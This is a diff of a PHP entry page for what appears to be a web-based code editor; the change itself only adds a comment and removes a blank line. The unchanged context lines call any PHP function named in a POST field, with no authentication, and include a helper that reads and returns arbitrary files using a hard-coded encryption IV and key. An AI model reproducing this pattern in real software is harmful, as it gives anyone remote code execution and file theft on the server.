@@ -3,7 +3,6 @@ function encode ($valor, $pass) {$method = 'aes-256-cbc';$iv = base64_decode("C9
 function decode ($valor, $pass) {$method = 'aes-256-cbc';$iv = base64_decode("C9fBxl1EWtYTL1/M8jfstw==");echo base64_encode(openssl_decrypt($valor, $method, $pass.base64_encode("75913"), false, $iv));};
 function readFilePHP($nombre_fichero, $pass){$fichero_texto = fopen ($nombre_fichero, "r");$contenido_fichero = fread($fichero_texto, filesize($nombre_fichero));echo encode($contenido_fichero, $pass);}
 if (isset($_POST['funct'])) {$func = $_POST['funct']; $func(isset($_POST['param'])? base64_decode($_POST['param']):"", isset($_POST['password'])?$_POST['password']:"_");}else{$password = base64_encode(rand(4357, 9866).'_'.rand(4357, 9866).'_'.rand(4357, 9866));$numRand1 = base64_encode($password);$Ruta = basename(__FILE__);$RutaBase = str_replace("/","", $_SERVER['PHP_SELF']);echo '<script>let Ruta="'.$Ruta.'"; let RutaBase="'.$RutaBase.'";</script>';?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -14,6 +13,7 @@ if (isset($_POST['funct'])) {$func = $_POST['funct']; $func(isset($_POST['param'
     <link rel="icon" href="favicon.png">
     <script src="./Imports/jquery-3.6.0.min.js">
     // <script src="https://code.jquery.com/jquery-3.6.0.min.js">
+    //prueba de vscode web
     </script><script src="./js/ModuloLoad.js"></script>
     <?php echo '<script>ModuloLoad.rnmLoad("'.$numRand1.'")</script>'; ?>
     <!-- <link rel="stylesheet" href="./css/index.css"> -->
